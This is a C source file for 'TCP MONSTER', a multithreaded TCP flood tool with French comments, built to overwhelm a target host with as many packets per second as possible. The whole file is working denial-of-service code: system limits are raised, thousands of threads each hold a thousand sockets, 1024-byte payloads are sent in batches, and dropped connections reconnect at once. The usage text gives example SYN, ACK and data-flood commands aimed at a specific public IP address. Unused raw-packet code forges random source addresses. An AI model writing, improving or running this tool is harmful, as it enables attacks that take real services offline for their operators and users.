/*
 * TCP MONSTER - Maximum PPS TCP Flood
 * Target: Millions of packets per second
 * 
 * Compilation:
 *   gcc tcp_monster.c -o tcp -pthread -O3 -march=native -mtune=native -flto -ffast-math -funroll-loops -Wall
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <sched.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>

// ============================================================================
// CONFIGURATION MONSTER MODE
// ============================================================================

#define MAX_THREADS 4000
#define SOCKETS_PER_THREAD 1000
#define MAX_EVENTS 2000
#define PAYLOAD_SIZE 1024                // Taille des paquets TCP
#define SEND_BATCH 100                   // Envoyer par batches

// Flags TCP pour flood
#define TCP_FLAG_SYN 1
#define TCP_FLAG_ACK 2
#define TCP_FLAG_PSH 4
#define TCP_FLAG_FIN 8
#define TCP_FLAG_RST 16

// ============================================================================
// STRUCTURES
// ============================================================================

typedef struct {
    int sock;
    unsigned char state;
    unsigned int seq;
} __attribute__((packed)) Connection;

typedef struct {
    char *target_ip;
    int port;
    int tcp_flags;
    time_t end_time;
    int thread_id;
    
    volatile unsigned long *total_packets;
    volatile unsigned long *total_bytes;
    volatile unsigned long *total_connections;
    volatile int *stop_flag;
} ThreadData;

// ============================================================================
// VARIABLES GLOBALES
// ============================================================================

static char g_cached_ip[64] = {0};

// ============================================================================
// OPTIMISATIONS SYSTÈME
// ============================================================================

void monster_optimize_system() {
    struct rlimit rl;
    rl.rlim_cur = 10000000;
    rl.rlim_max = 10000000;
    setrlimit(RLIMIT_NOFILE, &rl);
    
    mlockall(MCL_CURRENT | MCL_FUTURE);
    
    struct sched_param sp;
    sp.sched_priority = sched_get_priority_max(SCHED_FIFO);
    sched_setscheduler(0, SCHED_FIFO, &sp);
}

// ============================================================================
// DNS
// ============================================================================

static inline int resolve_host_cached(const char *hostname, char *ip) {
    if (g_cached_ip[0] != '\0') {
        strcpy(ip, g_cached_ip);
        return 0;
    }
    
    struct hostent *he = gethostbyname(hostname);
    if (!he) return -1;
    
    struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
    if (addr_list[0]) {
        strcpy(ip, inet_ntoa(*addr_list[0]));
        strcpy(g_cached_ip, ip);
        return 0;
    }
    return -1;
}

// ============================================================================
// CRÉATION SOCKET RAW OPTIMISÉE
// ============================================================================

static inline int create_raw_socket() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        // Fallback sur socket normal
        sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, IPPROTO_TCP);
    }
    
    if (sock < 0) return -1;
    
    // Options agressives
    int opt = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
#ifdef SO_REUSEPORT
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
#endif
    
    // Buffers
    int bufsize = 256 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    
    // Quickack
    setsockopt(sock, IPPROTO_TCP, TCP_QUICKACK, &opt, sizeof(opt));
    
    // Linger off
    struct linger ling = {0, 0};
    setsockopt(sock, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
    
    // Non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    return sock;
}

// ============================================================================
// SOCKET STANDARD ULTRA-RAPIDE
// ============================================================================

static inline int create_fast_socket(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    // Options
    int opt = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
#ifdef SO_REUSEPORT
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
#endif
    
    int bufsize = 128 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
    
    setsockopt(sock, IPPROTO_TCP, TCP_QUICKACK, &opt, sizeof(opt));
    
    struct linger ling = {0, 0};
    setsockopt(sock, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
    
    // Connecter
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    
    return sock;
}

// ============================================================================
// CALCUL CHECKSUM TCP/IP
// ============================================================================

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;
    
    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// ============================================================================
// CONSTRUCTION PAQUET TCP RAW
// ============================================================================

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

void build_tcp_packet(char *packet, const char *source_ip, const char *dest_ip, 
                      int source_port, int dest_port, int flags, int seq, int ack,
                      const char *payload, int payload_len) {
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_header psh;
    
    char *pseudogram = malloc(sizeof(struct pseudo_header) + sizeof(struct tcphdr) + payload_len);
    
    // IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    inet_pton(AF_INET, source_ip, &iph->saddr);
    inet_pton(AF_INET, dest_ip, &iph->daddr);
    iph->check = checksum((unsigned short *)packet, iph->tot_len);
    
    // TCP Header
    tcph->source = htons(source_port);
    tcph->dest = htons(dest_port);
    tcph->seq = htonl(seq);
    tcph->ack_seq = htonl(ack);
    tcph->doff = 5;
    tcph->fin = (flags & TCP_FLAG_FIN) ? 1 : 0;
    tcph->syn = (flags & TCP_FLAG_SYN) ? 1 : 0;
    tcph->rst = (flags & TCP_FLAG_RST) ? 1 : 0;
    tcph->psh = (flags & TCP_FLAG_PSH) ? 1 : 0;
    tcph->ack = (flags & TCP_FLAG_ACK) ? 1 : 0;
    tcph->urg = 0;
    tcph->window = htons(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    // Pseudo header pour checksum
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + payload_len);
    
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
    if (payload_len > 0) {
        memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), payload, payload_len);
        memcpy(pseudogram + sizeof(struct pseudo_header) + sizeof(struct tcphdr), payload, payload_len);
    }
    
    tcph->check = checksum((unsigned short*)pseudogram, sizeof(struct pseudo_header) + sizeof(struct tcphdr) + payload_len);
    
    free(pseudogram);
}

// ============================================================================
// WORKER THREAD MONSTER MODE
// ============================================================================

void* tcp_monster_worker(void *arg) {
    ThreadData *data = (ThreadData*)arg;
    
    // Pin to CPU
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(data->thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    unsigned long local_packets = 0;
    unsigned long local_bytes = 0;
    unsigned long local_connections = 0;
    
    // Epoll
    int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
    if (epoll_fd < 0) return NULL;
    
    // Pool de connexions
    Connection *conns = aligned_alloc(64, SOCKETS_PER_THREAD * sizeof(Connection));
    memset(conns, 0, SOCKETS_PER_THREAD * sizeof(Connection));
    
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        conns[i].sock = -1;
        conns[i].seq = rand();
    }
    
    // Buffers
    char payload[PAYLOAD_SIZE];
    memset(payload, 0x41, PAYLOAD_SIZE);  // Remplir avec 'A'
    
    struct epoll_event *events = malloc(MAX_EVENTS * sizeof(struct epoll_event));
    
    // IP source aléatoire (pour flood)
    char source_ip[16];
    snprintf(source_ip, sizeof(source_ip), "192.%d.%d.%d", 
             rand() % 256, rand() % 256, rand() % 256);
    
    // Pré-créer toutes les connexions
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        int sock = create_fast_socket(data->target_ip, data->port);
        
        if (sock >= 0) {
            conns[i].sock = sock;
            conns[i].state = 0;
            local_connections++;
            
            struct epoll_event ev;
            ev.events = EPOLLOUT | EPOLLIN | EPOLLET | EPOLLRDHUP;
            ev.data.u32 = i;
            epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sock, &ev);
        }
    }
    
    unsigned int cycle = 0;
    
    // BOUCLE PRINCIPALE ULTRA-RAPIDE
    while (!(*data->stop_flag) && time(NULL) < data->end_time) {
        cycle++;
        
        int nfds = epoll_wait(epoll_fd, events, MAX_EVENTS, 0);
        
        for (int i = 0; i < nfds; i++) {
            unsigned int idx = events[i].data.u32;
            Connection *conn = &conns[idx];
            
            if (conn->sock < 0) continue;
            
            // SEND EN MASSE
            if (events[i].events & EPOLLOUT) {
                // Envoyer plusieurs paquets d'un coup (batch)
                for (int batch = 0; batch < SEND_BATCH; batch++) {
                    int sent = send(conn->sock, payload, PAYLOAD_SIZE, MSG_DONTWAIT | MSG_NOSIGNAL);
                    
                    if (sent > 0) {
                        local_packets++;
                        local_bytes += sent;
                        conn->seq += sent;
                    } else {
                        break;
                    }
                }
                
                conn->state = 1;
            }
            
            // RECEIVE (ignorer, on s'en fout)
            if (events[i].events & EPOLLIN) {
                char dump[2048];
                recv(conn->sock, dump, sizeof(dump), MSG_DONTWAIT);
            }
            
            // ERROR - Reconnexion immédiate
            if (events[i].events & (EPOLLERR | EPOLLHUP | EPOLLRDHUP)) {
                epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->sock, NULL);
                close(conn->sock);
                
                int sock = create_fast_socket(data->target_ip, data->port);
                if (sock >= 0) {
                    conn->sock = sock;
                    conn->state = 0;
                    conn->seq = rand();
                    local_connections++;
                    
                    struct epoll_event ev;
                    ev.events = EPOLLOUT | EPOLLIN | EPOLLET | EPOLLRDHUP;
                    ev.data.u32 = idx;
                    epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sock, &ev);
                }
            }
        }
        
        // Recréer connexions mortes régulièrement
        if (cycle % 50 == 0) {
            for (int i = 0; i < 50; i++) {
                if (conns[i].sock < 0) {
                    int sock = create_fast_socket(data->target_ip, data->port);
                    if (sock >= 0) {
                        conns[i].sock = sock;
                        conns[i].state = 0;
                        conns[i].seq = rand();
                        local_connections++;
                        
                        struct epoll_event ev;
                        ev.events = EPOLLOUT | EPOLLIN | EPOLLET | EPOLLRDHUP;
                        ev.data.u32 = i;
                        epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sock, &ev);
                    }
                }
            }
        }
    }
    
    // Cleanup
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        if (conns[i].sock >= 0) close(conns[i].sock);
    }
    close(epoll_fd);
    free(conns);
    free(events);
    
    __sync_fetch_and_add(data->total_packets, local_packets);
    __sync_fetch_and_add(data->total_bytes, local_bytes);
    __sync_fetch_and_add(data->total_connections, local_connections);
    
    return NULL;
}

// ============================================================================
// MAIN
// ============================================================================

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("TCP MONSTER - Maximum PPS TCP Flood\n\n");
        printf("Usage: %s <target> <port> <time> <threads> [flags]\n\n", argv[0]);
        printf("Flags:\n");
        printf("  1  = SYN\n");
        printf("  2  = ACK\n");
        printf("  4  = PSH\n");
        printf("  8  = FIN\n");
        printf("  16 = RST\n");
        printf("  (combine with +, e.g., 3 = SYN+ACK)\n\n");
        printf("Examples:\n");
        printf("  %s 142.171.195.145 80 60 1000 1      # SYN flood\n", argv[0]);
        printf("  %s 142.171.195.145 80 60 1000 2      # ACK flood\n", argv[0]);
        printf("  %s 142.171.195.145 80 60 1000 4      # PSH flood\n", argv[0]);
        printf("  %s 142.171.195.145 80 60 1000        # Data flood\n", argv[0]);
        return 1;
    }
    
    const char *target = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int tcp_flags = (argc >= 6) ? atoi(argv[5]) : 0;
    
    if (threads > MAX_THREADS) threads = MAX_THREADS;
    
    monster_optimize_system();
    
    // Résoudre IP
    char target_ip[64];
    if (resolve_host_cached(target, target_ip) != 0) {
        // Si pas de DNS, assume que c'est déjà une IP
        strncpy(target_ip, target, 63);
    }
    
    printf("\n╔════════════════════════════════════════════════════════════════╗\n");
    printf("║              🔥 TCP MONSTER - PPS MODE 🔥                      ║\n");
    printf("╚════════════════════════════════════════════════════════════════╝\n\n");
    printf("Target:      %s\n", target_ip);
    printf("Port:        %d\n", port);
    printf("Duration:    %d seconds\n", duration);
    printf("Threads:     %d\n", threads);
    printf("Connections: %d (%d per thread)\n", threads * SOCKETS_PER_THREAD, SOCKETS_PER_THREAD);
    printf("Payload:     %d bytes\n", PAYLOAD_SIZE);
    printf("Batch size:  %d packets\n", SEND_BATCH);
    printf("TCP Flags:   ");
    if (tcp_flags == 0) printf("DATA FLOOD");
    else {
        if (tcp_flags & TCP_FLAG_SYN) printf("SYN ");
        if (tcp_flags & TCP_FLAG_ACK) printf("ACK ");
        if (tcp_flags & TCP_FLAG_PSH) printf("PSH ");
        if (tcp_flags & TCP_FLAG_FIN) printf("FIN ");
        if (tcp_flags & TCP_FLAG_RST) printf("RST ");
    }
    printf("\n\n");
    
    srand(time(NULL));
    
    volatile int stop_flag = 0;
    volatile unsigned long total_packets = 0;
    volatile unsigned long total_bytes = 0;
    volatile unsigned long total_connections = 0;
    
    ThreadData data;
    data.target_ip = target_ip;
    data.port = port;
    data.tcp_flags = tcp_flags;
    data.end_time = time(NULL) + duration;
    data.total_packets = &total_packets;
    data.total_bytes = &total_bytes;
    data.total_connections = &total_connections;
    data.stop_flag = &stop_flag;
    
    pthread_t *handles = malloc(threads * sizeof(pthread_t));
    
    printf("[*] Launching %d threads...\n", threads);
    
    for (int i = 0; i < threads; i++) {
        data.thread_id = i;
        pthread_create(&handles[i], NULL, tcp_monster_worker, &data);
    }
    
    printf("[*] 💥 TCP FLOOD ACTIVATED 💥\n\n");
    
    unsigned long last_packets = 0;
    unsigned long last_bytes = 0;
    time_t start_time = time(NULL);
    
    while (time(NULL) < data.end_time) {
        sleep(2);
        
        unsigned long current_packets = total_packets;
        unsigned long current_bytes = total_bytes;
        
        unsigned long pps = (current_packets - last_packets) / 2;
        double gbps = ((current_bytes - last_bytes) * 8.0) / (2.0 * 1000000000.0);
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        
        printf("[⚡] %lu pkts | %lu PPS | %.3f Gbps | %lu conns\n",
               (unsigned long)total_packets, pps, gbps, (unsigned long)total_connections);
    }
    
    stop_flag = 1;
    
    for (int i = 0; i < threads; i++) {
        pthread_join(handles[i], NULL);
    }
    
    free(handles);
    
    int elapsed = (int)difftime(time(NULL), start_time);
    double avg_pps = elapsed > 0 ? (double)total_packets / elapsed : 0;
    double avg_gbps = elapsed > 0 ? ((double)total_bytes * 8.0) / (elapsed * 1000000000.0) : 0;
    
    printf("\n╔════════════════════════════════════════════════════════════════╗\n");
    printf("║                    💥 FINAL STATISTICS 💥                      ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");
    printf("║  Total Packets:   %-15lu                            ║\n", (unsigned long)total_packets);
    printf("║  Total Bytes:     %-15lu                            ║\n", (unsigned long)total_bytes);
    printf("║  Connections:     %-15lu                            ║\n", (unsigned long)total_connections);
    printf("║  Average PPS:     %-15.0f                            ║\n", avg_pps);
    printf("║  Average Gbps:    %-15.3f                            ║\n", avg_gbps);
    printf("║  Total Data:      %-15.2f GB                        ║\n", (double)total_bytes / 1073741824.0);
    printf("╚════════════════════════════════════════════════════════════════╝\n");
    
    return 0;
}
